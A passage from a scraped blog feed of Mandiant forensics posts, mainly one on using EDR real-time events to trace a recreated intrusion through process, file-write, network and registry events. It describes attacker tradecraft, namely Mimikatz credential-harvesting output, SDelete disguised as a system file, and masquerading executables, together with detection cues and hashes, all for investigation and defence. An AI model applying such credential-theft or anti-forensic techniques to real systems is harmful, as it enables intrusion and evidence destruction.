$I30 in the index root and index allocation attributes. To extract the content of an index attribute, in the explorer pane, highlight the folder. In the file list pane, right click the relevant $I30 file and choose the option to \"export\". This will prompt you for a location to save the binary content.</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/File-List_Pic-2.png\"><img class=\"alignnone size-full wp-image-3268\" title=\"File List\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/File-List_Pic-2.png\" width=\"484\" height=\"58\" /></a></p> \n <h4>Mandiant Intelligent Response<sup>®</sup></h4> \n <p>The Mandiant Intelligent Response<sup>®</sup> (MIR) agent v.2.2 has the ability to extract INDX records natively. To generate a list of INDX buffers in MIR, run a RAW file audit. One of the options in the audit is to \"Parse NTFS INDX Buffers\". You can run this recursively, or you can target specific directories. We recommend the latter because this option will generate numerous entries when done recursively.</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-2_Parse-NTFS-INDX-Buffers-Option.png\"><img class=\"alignnone size-full wp-image-3431\" title=\"Parse NTFS INDX Buffers Option\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-2_Parse-NTFS-INDX-Buffers-Option.png\" width=\"559\" height=\"228\" /></a></p> \n <p>To display a list of parsed INDX buffers, you can filter a file listing in MIR by choosing the \"FileAttributes\" are \"like\" \"*INDX*\". The MIR agent recognizes \"INDX\" as an attribute because the files listed in the indices may or may not be deleted.</p> \n <h4> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-3_Filtering-in-MIR-for-INDX-Buffers.png\"><img class=\"alignnone size-full wp-image-3432\" title=\"Filtering in MIR for INDX Buffers\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-3_Filtering-in-MIR-for-INDX-Buffers.png\" width=\"427\" height=\"158\" /></a></h4> \n <h4>Results</h4> \n <p>Regardless of which method is used, your binary file should begin with the string \"INDX\" if you grabbed the correct data stream. You can verify the results quickly in a hex editor. Ensure that the first four bytes of the binary data is the string \"INDX\".</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Binary-Data_Pic-3.png\"><img class=\"alignnone size-full wp-image-3269\" title=\"Binary File\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Binary-Data_Pic-3.png\" width=\"763\" height=\"750\" /></a></p> \n <h4>Conclusion</h4> \n <p>This example demonstrates three ways to use various tools to extract INDX attribute content. Our next post will detail the internal structures of a file name attribute. A file name attribute will exist for each file tracked in a directory. These structures include the MACb (Modified, Accessed, Changed, and birth) times of a file and can be a valuable timeline source in an investigation.</p> \n</div>","descriptionType":"html","publishedDate":"Tue, 18 Sep 2012 23:23:24 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/legacy/ammo/Copy_UnErase_Pic-1.png","linkMd5":"5603af298b6e39aed627facd6859e3b3","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn43@2020_6/2020/08/24/14-11-06-456_495409a9dfa5eac2.webp","destWidth":379,"destHeight":88,"sourceBytes":2211,"destBytes":5166,"author":"William Ballenthin","articleImgCdnMap":{"https://www.fireeye.com/content/dam/legacy/ammo/Copy_UnErase_Pic-1.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn43@2020_6/2020/08/24/14-11-06-456_495409a9dfa5eac2.webp","https://www.fireeye.com/content/dam/legacy/ammo/File-List_Pic-2.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn21@2020_2/2020/08/24/14-11-12-830_4c9a18f4f2baaf0b.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-2_Parse-NTFS-INDX-Buffers-Option.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn19@2020_6/2020/08/24/14-11-18-107_3c103fdc88d93532.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-3_Filtering-in-MIR-for-INDX-Buffers.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn38@2020_3/2020/08/24/14-11-15-132_7c871d15c7fe4b59.webp","https://www.fireeye.com/content/dam/legacy/ammo/Binary-Data_Pic-3.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn58@2020_3/2020/08/24/14-11-16-888_76d34893b217c45e.webp"},"publishedOrCreatedDate":1598278264226},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Using Real-Time Events in Investigations","link":"http://www.fireeye.com/blog/threat-research/2020/05/using-real-time-events-in-investigations.html","description":"<p>To understand what a threat actor did on a Windows system, analysts often turn to the tried and true sources of historical endpoint artifacts such as the Master File Table (MFT), registry hives, and Application Compatibility Cache (AppCompat). However, these evidence sources were not designed with detection or incident response in mind; crucial details may be omitted or cleared through anti-forensic methods. By looking at historical evidence alone, an analyst may not see the full story.</p> \n<p>Real-time events can be thought of as forensic artifacts specifically designed for detection and incident response, implemented through Enterprise Detection and Response (EDR) solutions or enhanced logging implementations like <a href=\"https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon\">Sysmon</a>. During active-attacker endpoint investigations, <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services.html\">FireEye Mandiant</a> has found real-time events to be useful in filling in the gaps of what an attacker did. These events record different types of system activities such as process execution, file write activity, network connections, and more.</p> \n<p>During incident response engagements, Mandiant uses <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/products/endpoint-security.html\">FireEye Endpoint Security</a> to track endpoint system events in real-time. This feature allows investigators to track an attacker on any system by alerting on and reviewing these real-time events. An analyst can use our solution’s built-in Audit Viewer or Redline to review real-time events.</p> \n<p>Let’s look at some examples of Windows real-time events available on our solution and how they can be leveraged during an investigation. Let’s assume the account <span class=\"code\">TEST-DOMAIN\\BackupAdmin</span> was an inactive Administrator account compromised by an attacker. Please note the examples provided in this post are based on real-time events observed during engagements but have been recreated or altered to preserve client confidentiality.</p> \n<h4>Process Execution Events</h4> \n<p>There are many historical process execution artifacts including <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2017/04/appcompatprocessor.html\">AppCompat</a>, <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2015/06/caching_out_the_val.html\">AmCache</a>, <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2016/12/do_you_see_what_icc.html\">WMI CCM_RecentlyUsedApps</a>, and <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2013/08/execute.html\">more</a>. A single artifact rarely covers all the useful details relating to a process's execution, but real-time process execution events change that. Our solution’s real-time process execution events record execution time, full process path, process identification number (PID), parent process path, parent PID, user, command line arguments, and even the process MD5 hash.</p> \n<p>Table 1 provides an example of a real-time process execution event recorded by our solution.</p> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"150\" valign=\"top\"><p> <b>Field</b></p> </td> \n   <td width=\"474\" valign=\"top\"><p> <b>Example</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"150\" valign=\"top\"><p>Timestamp (UTC)</p> </td> \n   <td width=\"474\" valign=\"top\"><p> <span class=\"code\">2020-03-10 16:40:58.235</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"150\" valign=\"top\"><p>Sequence Number</p> </td> \n   <td width=\"474\" valign=\"top\"><p> <span class=\"code\">2879512</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"150\" valign=\"top\"><p>PID</p> </td> \n   <td width=\"474\" valign=\"top\"><p> <span class=\"code\">9392</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"150\" valign=\"top\"><p>Process Path</p> </td> \n   <td width=\"474\" valign=\"top\"><p> <span class=\"code\">C:\\Windows\\Temp\\legitservice.exe</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"150\" valign=\"top\"><p>Username</p> </td> \n   <td width=\"474\" valign=\"top\"><p> <span class=\"code\">TEST-DOMAIN\\BackupAdmin</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"150\" valign=\"top\"><p>Parent PID</p> </td> \n   <td width=\"474\" valign=\"top\"><p> <span class=\"code\">9103</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"150\" valign=\"top\"><p>Parent Process Path</p> </td> \n   <td width=\"474\" valign=\"top\"><p> <span class=\"code\">C:\\Windows\\System32\\cmd.exe</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"150\" valign=\"top\"><p>EventType</p> </td> \n   <td width=\"474\" valign=\"top\"><p> <span class=\"code\">Start</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"150\" valign=\"top\"><p>ProcessCmdLine</p> </td> \n   <td width=\"474\" valign=\"top\"><p> <span class=\"code\">\"C:\\Windows\\Temp\\legitservice.exe\"&nbsp; -b -m</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"150\" valign=\"top\"><p>Process MD5 Hash</p> </td> \n   <td width=\"474\" valign=\"top\"><p> <span class=\"code\">a823bc31395539816e8e4664e884550f</span></p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Table 1: Example real-time process execution event</span></p> \n<p>Based on this real-time process execution event, the process <span class=\"code\">C:\\Windows\\System32\\cmd.exe</span> with PID 9103 executed the file <span class=\"code\">C:\\Windows\\Temp\\legitservice.exe</span> with PID 9392 and the MD5 hash <span class=\"code\">a823bc31395539816e8e4664e884550f</span>. This new process used the command line arguments <span class=\"code\">-b</span> <span class=\"code\">-m</span> under the user context of <span class=\"code\">TEST-DOMAIN\\BackupAdmin</span>.</p> \n<p>We can compare this real-time event with what an analyst might see in other process execution artifacts. Table 2 provides an example AppCompat entry for the same executed process. Note the recorded timestamp is for the last modified time of the file, not the process start time.</p> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"150\" valign=\"top\"><p> <b>Field</b></p> </td> \n   <td width=\"474\" valign=\"top\"><p> <b>Example</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"150\" valign=\"top\"><p>File Last<br /> Modified (UTC)</p> </td> \n   <td width=\"474\" valign=\"top\"><p> <span class=\"code\">2020-03-07 23:48:09</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"150\" valign=\"top\"><p>File Path</p> </td> \n   <td width=\"474\" valign=\"top\"><p> <span class=\"code\">C:\\Windows\\Temp\\legitservice.exe</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"150\" valign=\"top\"><p>Executed Flag</p> </td> \n   <td width=\"474\" valign=\"top\"><p> <span class=\"code\">TRUE</span></p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Table 2: Example AppCompat entry</span></p> \n<p>Table 3 provides an example AmCache entry. Note the last modified time of the registry key can usually be used to determine the process start time and this artifact includes the SHA1 hash of the file.</p> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"150\" valign=\"top\"><p> <b>Field</b></p> </td> \n   <td width=\"474\" valign=\"top\"><p> <b>Example</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"150\" valign=\"top\"><p>Registry Key<br /> Last Modified (UTC)</p> </td> \n   <td width=\"474\" valign=\"top\"><p> <span class=\"code\">2020-03-10 16:40:58</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"150\" valign=\"top\"><p>File Path</p> </td> \n   <td width=\"474\" valign=\"top\"><p> <span class=\"code\">C:\\Windows\\Temp\\legitservice.exe</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"150\" valign=\"top\"><p>File Sha1 Hash</p> </td> \n   <td width=\"474\" valign=\"top\"><p> <span class=\"code\">2b2e04ab822ef34969b7d04642bae47385be425c</span></p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Table 3: Example AmCache entry</span></p> \n<p>Table 4 provides an example Windows Event Log process creation event. Note this artifact includes the PID in hexadecimal notation, details about the parent process, and even a field for where the process command line arguments should be. In this example the command line arguments are not present because they are <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688\">disabled by default</a>&nbsp;and Mandiant rarely sees this policy enabled by clients on investigations.</p> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\" width=\"750\"> \n <tbody> \n  <tr> \n   <td width=\"90\" valign=\"top\"><p> <b>Field</b></p> </td> \n   <td width=\"534\" valign=\"top\"><p> <b>Example</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"90\" valign=\"top\"><p>Write Time (UTC)</p> </td> \n   <td width=\"534\" valign=\"top\"><p> <span class=\"code\">2020-03-10 16:40:58</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"90\" valign=\"top\"><p>Log</p> </td> \n   <td width=\"534\" valign=\"top\"><p> <span class=\"code\">Security</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"90\" valign=\"top\"><p>Source</p> </td> \n   <td width=\"534\" valign=\"top\"><p> <span class=\"code\">Microsoft Windows security</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"90\" valign=\"top\"><p>EID</p> </td> \n   <td width=\"534\" valign=\"top\"><p> <span class=\"code\">4688</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"90\" valign=\"top\"><p>Message</p> </td> \n   <td width=\"534\" valign=\"top\"><p> <span class=\"code\">A new process has been created.</span></p> <p> <span class=\"code\">Creator Subject:<br /> &nbsp; &nbsp; &nbsp; Security ID:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TEST-DOMAIN\\BackupAdmin<br /> &nbsp; &nbsp; &nbsp; Account Name:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; BackupAdmin<br /> &nbsp; &nbsp; &nbsp; Account Domain:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TEST-DOMAIN<br /> &nbsp; &nbsp; &nbsp; Logon ID:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x6D6AD</span></p> <p> <span class=\"code\">Target Subject:<br /> &nbsp; &nbsp; &nbsp; Security ID:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NULL SID<br /> &nbsp; &nbsp; &nbsp; Account Name:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -<br /> &nbsp; &nbsp; &nbsp; Account Domain:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -<br /> &nbsp; &nbsp; &nbsp; Logon ID:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x0</span></p> <p> <span class=\"code\">Process Information:<br /> &nbsp; &nbsp; &nbsp; New Process ID:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x24b0<br /> &nbsp; &nbsp; &nbsp; New Process Name:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; C:\\Windows\\Temp\\legitservice.exe<br /> &nbsp; &nbsp; &nbsp; Token Elevation Type:&nbsp; &nbsp; %%1938<br /> &nbsp; &nbsp; &nbsp; Mandatory Label:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Mandatory Label\\Medium Mandatory Level<br /> &nbsp; &nbsp; &nbsp; Creator Process ID:&nbsp; &nbsp; &nbsp; 0x238f<br /> &nbsp; &nbsp; &nbsp; Creator Process Name:&nbsp; &nbsp; C:\\Windows\\System32\\cmd.exe<br /> &nbsp; &nbsp; &nbsp; Process Command Line:&nbsp; &nbsp;&nbsp;</span></p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Table 4: Example Windows event log process creation event</span></p> \n<p>If we combine the evidence available in AmCache with a fully detailed Windows Event Log process creation event, we could match the evidence available in the real-time event except for a small difference in file hash types.</p> \n<h4>File Write Events</h4> \n<p>An attacker may choose to modify or delete important evidence. If an attacker uses a file shredding tool like Sysinternal’s SDelete, it is unlikely the analyst will recover the original contents of the file. Our solution’s real-time file write events are incredibly useful in situations like this because they record the MD5 hash of the files written and partial contents of the file. File write events also record which process created or modified the file in question.</p> \n<p>Table 5 provides an example of a real-time file write event recorded by our solution.</p> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"162\" valign=\"top\"><p> <b>Field</b></p> </td> \n   <td width=\"462\" valign=\"top\"><p> <b>Example</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"162\" valign=\"top\"><p>Timestamp (UTC)</p> </td> \n   <td width=\"462\" valign=\"top\"><p> <span class=\"code\">2020-03-10 16:42:59.956</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"162\" valign=\"top\"><p>Sequence Number</p> </td> \n   <td width=\"462\" valign=\"top\"><p> <span class=\"code\">2884312</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"162\" valign=\"top\"><p>PID</p> </td> \n   <td width=\"462\" valign=\"top\"><p> <span class=\"code\">9392</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"162\" valign=\"top\"><p>Process Path</p> </td> \n   <td width=\"462\" valign=\"top\"><p> <span class=\"code\">C:\\Windows\\Temp\\legitservice.exe</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"162\" valign=\"top\"><p>Username</p> </td> \n   <td width=\"462\" valign=\"top\"><p> <span class=\"code\">TEST-DOMAIN\\BackupAdmin</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"162\" valign=\"top\"><p>Device Path</p> </td> \n   <td width=\"462\" valign=\"top\"><p> <span class=\"code\">\\Device\\HarddiskVolume2</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"162\" valign=\"top\"><p>File Path</p> </td> \n   <td width=\"462\" valign=\"top\"><p> <span class=\"code\">C:\\Windows\\Temp\\WindowsServiceNT.log</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"162\" valign=\"top\"><p>File MD5 Hash</p> </td> \n   <td width=\"462\" valign=\"top\"><p> <span class=\"code\">30a82a8a864b6407baf9955822ded8f9</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"162\" valign=\"top\"><p>Num Bytes Seen Written</p> </td> \n   <td width=\"462\" valign=\"top\"><p> <span class=\"code\">8</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"162\" valign=\"top\"><p>Size</p> </td> \n   <td width=\"462\" valign=\"top\"><p> <span class=\"code\">658</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"162\" valign=\"top\"><p>Writes</p> </td> \n   <td width=\"462\" valign=\"top\"><p> <span class=\"code\">4</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"162\" valign=\"top\"><p>Event reason</p> </td> \n   <td width=\"462\" valign=\"top\"><p> <span class=\"code\">File closed</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"162\" valign=\"top\"><p>Closed</p> </td> \n   <td width=\"462\" valign=\"top\"><p> <span class=\"code\">TRUE</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"162\" valign=\"top\"><p>Base64 Encoded<br /> Data At Lowest Offset</p> </td> \n   <td width=\"462\" valign=\"top\"><p> <span class=\"code\">Q3JlYXRpbmcgJ1dpbmRvd3NTZXJ2aWNlTlQubG9nJy<br /> Bsb2dmaWxlIDogT0sNCm1pbWlrYXR6KGNvbW1hbmQ</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"162\" valign=\"top\"><p>Text At Lowest Offset</p> </td> \n   <td width=\"462\" valign=\"top\"><p> <span class=\"code\">Creating 'WindowsServiceNT.log' logfile : OK....mimikatz(command</span></p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Table 5: Example real-time file write event</span></p> \n<p>Based on this real-time file write event, the malicious executable <span class=\"code\">C:\\Windows\\Temp\\legitservice.exe</span> wrote the file <span class=\"code\">C:\\Windows\\Temp\\WindowsServiceNT.log</span> to disk with the MD5 hash <span class=\"code\">30a82a8a864b6407baf9955822ded8f9</span>. Since the real-time event recorded the beginning of the written file, we can determine the file likely contained Mimikatz credential harvester output which Mandiant has observed commonly starts with <span class=\"code\">OK....mimikatz</span>.</p> \n<p>If we investigate a little later, we’ll see a process creation event for <span class=\"code\">C:\\Windows\\Temp\\taskassist.exe</span> with the MD5 file hash <span class=\"code\">2b5cb081721b8ba454713119be062491</span> followed by several file write events for this process summarized in Table 6.</p> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\" width=\"750\"> \n <tbody> \n  <tr> \n   <td width=\"186\" valign=\"top\"><p> <b>Timestamp</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p> <b>File Path</b></p> </td> \n   <td width=\"126\" valign=\"top\"><p> <b>File Size</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"186\" valign=\"top\"><p> <span class=\"code\">2020-03-10 16:53:42.351</span></p> </td> \n   <td width=\"312\" valign=\"top\"><p> <span class=\"code\">C:\\Windows\\Temp\\WindowsServiceNT.log</span></p> </td> \n   <td width=\"126\" valign=\"top\"><p> <span class=\"code\">638</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"186\" valign=\"top\"><p> <span class=\"code\">2020-03-10 16:53:42.351</span></p> </td> \n   <td width=\"312\" valign=\"top\"><p> <span class=\"code\">C:\\Windows\\Temp\\AAAAAAAAAAAAAAAA.AAA</span></p> </td> \n   <td width=\"126\" valign=\"top\"><p> <span class=\"code\">638</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"186\" valign=\"top\"><p> <span class=\"code\">2020-03-10 16:53:42.351</span></p> </td> \n   <td width=\"312\" valign=\"top\"><p> <span class=\"code\">C:\\Windows\\Temp\\BBBBBBBBBBBBBBBB.BBB</span></p> </td> \n   <td width=\"126\" valign=\"top\"><p> <span class=\"code\">638</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"186\" valign=\"top\"><p> <span class=\"code\">2020-03-10 16:53:42.351</span></p> </td> \n   <td width=\"312\" valign=\"top\"><p> <span class=\"code\">C:\\Windows\\Temp\\CCCCCCCCCCCCCCCC.CCC</span></p> </td> \n   <td width=\"126\" valign=\"top\"><p> <span class=\"code\">638</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"186\" valign=\"top\"><p> <span class=\"code\">&nbsp;</span></p> </td> \n   <td width=\"312\" valign=\"top\"><p> <span class=\"code\">…</span></p> </td> \n   <td width=\"126\" valign=\"top\"><p> <span class=\"code\">&nbsp;</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"186\" valign=\"top\"><p> <span class=\"code\">2020-03-10 16:53:42.382</span></p> </td> \n   <td width=\"312\" valign=\"top\"><p> <span class=\"code\">C:\\Windows\\Temp\\XXXXXXXXXXXXXXXX.XXX</span></p> </td> \n   <td width=\"126\" valign=\"top\"><p> <span class=\"code\">638</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"186\" valign=\"top\"><p> <span class=\"code\">2020-03-10 16:53:42.382</span></p> </td> \n   <td width=\"312\" valign=\"top\"><p> <span class=\"code\">C:\\Windows\\Temp\\YYYYYYYYYYYYYYYY.YYY</span></p> </td> \n   <td width=\"126\" valign=\"top\"><p> <span class=\"code\">638</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"186\" valign=\"top\"><p> <span class=\"code\">2020-03-10 16:53:42.382</span></p> </td> \n   <td width=\"312\" valign=\"top\"><p> <span class=\"code\">C:\\Windows\\Temp\\ZZZZZZZZZZZZZZZZ.ZZZ</span></p> </td> \n   <td width=\"126\" valign=\"top\"><p> <span class=\"code\">638</span></p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Table 6: Example timeline of SDelete File write events</span></p> \n<p>Admittedly, this activity may seem strange at a first glance. If we do some research on the its file hash, we’ll see the process is actually SDelete masquerading as <span class=\"code\">C:\\Windows\\Temp\\taskassist.exe</span>. As part of its secure deletion process, <a href=\"https://docs.microsoft.com/en-us/sysinternals/downloads/sdelete\">SDelete</a> renames the file 26 times in a successive alphabetic manner.</p> \n<h4>Network Events</h4> \n<p>Incident responders rarely see evidence of network communication from historical evidence on an endpoint without enhanced logging. Usually, Mandiant relies on NetFlow data, network sensors with full or partial packet capture, or malware analysis to determine the command and control (C2) servers with which a malware sample can communicate. Our solution’s real-time network events record both local and remote network ports, the leveraged protocol, and the relevant process.</p> \n<p>Table 7 provides an example of a real-time IPv4 network event recorded by our solution.</p> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"138\" valign=\"top\"><p> <b>Field</b></p> </td> \n   <td width=\"486\" valign=\"top\"><p> <b>Example</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"138\" valign=\"top\"><p>Timestamp (UTC)</p> </td> \n   <td width=\"486\" valign=\"top\"><p> <span class=\"code\">2020-03-10 16:46:51.690</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"138\" valign=\"top\"><p>Sequence Number</p> </td> \n   <td width=\"486\" valign=\"top\"><p> <span class=\"code\">2895588</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"138\" valign=\"top\"><p>PID</p> </td> \n   <td width=\"486\" valign=\"top\"><p> <span class=\"code\">9392</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"138\" valign=\"top\"><p>Process + Path</p> </td> \n   <td width=\"486\" valign=\"top\"><p> <span class=\"code\">C:\\Windows\\Temp\\legitservice.exe</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"138\" valign=\"top\"><p>Username</p> </td> \n   <td width=\"486\" valign=\"top\"><p> <span class=\"code\">TEST-DOMAIN\\BackupAdmin</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"138\" valign=\"top\"><p>Local IP Address</p> </td> \n   <td width=\"486\" valign=\"top\"><p> <span class=\"code\">10.0.0.52</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"138\" valign=\"top\"><p>Local Port</p> </td> \n   <td width=\"486\" valign=\"top\"><p> <span class=\"code\">57472</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"138\" valign=\"top\"><p>Remote IP Address</p> </td> \n   <td width=\"486\" valign=\"top\"><p> <span class=\"code\">10.0.0.51</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"138\" valign=\"top\"><p>Remote Port</p> </td> \n   <td width=\"486\" valign=\"top\"><p> <span class=\"code\">443</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"138\" valign=\"top\"><p>Protocol</p> </td> \n   <td width=\"486\" valign=\"top\"><p> <span class=\"code\">TCP</span></p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Table 7: Example real-time network connection event</span></p> \n<p>Based on this real-time IPv4 network event, the malicious executable <span class=\"code\">C:\\Windows\\Temp\\legitservice.exe</span> made an outbound TCP connection to <span class=\"code\">10.0.0.51:443</span>.</p> \n<h4>Registry Key Events</h4> \n<p>By using historical evidence to investigate relevant timeframes and commonly abused registry keys, we can identify malicious or leveraged keys. Real-time registry key events are useful for linking processes to the modified registry keys. They can also show when an attacker deletes or renames a registry key. This is useful to an analyst because the only available timestamp recorded in the registry is the last modified time of a registry key, and this timestamp is updated if a parent key is updated.</p> \n<p>Table 8 provides an example of a real-time registry key event recorded by our solution.</p> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p> <b>Field</b></p> </td> \n   <td width=\"492\" valign=\"top\"><p> <b>Example</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>Timestamp (UTC)</p> </td> \n   <td width=\"492\" valign=\"top\"><p> <span class=\"code\">2020-03-10 16:46:56.409</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>Sequence Number</p> </td> \n   <td width=\"492\" valign=\"top\"><p> <span class=\"code\">2898196</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>PID</p> </td> \n   <td width=\"492\" valign=\"top\"><p> <span class=\"code\">9392</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>Process + Path</p> </td> \n   <td width=\"492\" valign=\"top\"><p> <span class=\"code\">C:\\Windows\\Temp\\legitservice.exe</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>Username</p> </td> \n   <td width=\"492\" valign=\"top\"><p> <span class=\"code\">TEST-DOMAIN\\BackupAdmin</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>Event Type</p> </td> \n   <td width=\"492\" valign=\"top\"><p> <span class=\"code\">3</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>Path</p> </td> \n   <td width=\"492\" valign=\"top\"><p> <span class=\"code\">HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<br /> LegitWindowsService\\ImagePath</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>Key Path</p> </td> \n   <td width=\"492\" valign=\"top\"><p> <span class=\"code\">CurrentControlSet\\Services\\LegitWindowsService</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>Original Path</p> </td> \n   <td width=\"492\" valign=\"top\"><p> <span 